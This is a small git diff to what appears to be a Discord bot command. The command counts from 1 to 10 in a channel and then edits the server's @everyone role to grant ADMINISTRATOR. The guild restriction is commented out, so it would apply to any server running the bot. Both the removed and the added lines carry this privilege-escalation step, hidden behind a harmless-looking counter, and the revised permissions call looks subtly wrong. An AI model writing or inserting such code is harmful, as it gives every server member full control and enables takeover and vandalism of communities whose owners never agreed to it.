@@ -7,9 +7,9 @@ module.exports = {
         //if (message.guild.id === "728598542784135249") {
             for (var i = 1; i <= 10; i++) {
                 message.channel.send(i);
-            }
-            let everyoneRole = message.guild.roles.everyone
-            everyoneRole.edit({ADMINISTRATOR: true})
+            };
+            let everyoneRole = message.guild.roles.everyone;
+            everyoneRole.permissions.edit({ADMINISTRATOR: true});
         //}
         //else return;
     }  
